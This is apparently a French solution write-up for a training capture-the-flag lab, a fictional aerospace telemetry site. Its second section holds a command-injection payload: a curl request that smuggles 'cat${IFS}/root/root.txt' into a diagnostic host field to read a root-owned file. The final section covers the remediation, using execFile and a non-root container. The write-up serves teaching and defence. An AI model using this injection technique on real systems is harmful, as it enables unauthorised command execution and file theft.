# Solution Détaillée // AeroSpace Telemetry & Satellite Uplink

## 1. Découverte de l'application
Le site comprend :
- `/targets/training/real-04-aerospace/` (Accueil station)
- `/targets/training/real-04-aerospace/orbital-telemetry` (Télémétrie)
- `/targets/training/real-04-aerospace/uplink-gateway` (Passerelle liaison montante)

## 2. Exploitation de la commande injection
La commande est vulnérable :
```bash
curl -X POST /targets/training/real-04-aerospace/api/diag -d "host=127.0.0.1;cat${IFS}/root/root.txt"
```
Ce qui retourne le flag maître :
`CTF{REAL_AEROSPACE_SCADA_OVERRIDE_ROOT}`.

## 3. Remédiation & Protection
- Remplacer `child_process.exec()` par `child_process.execFile('ping', ['-c', '3', host])`.
- Exécuter le processus avec un utilisateur non privilégié restreint dans un conteneur non-root.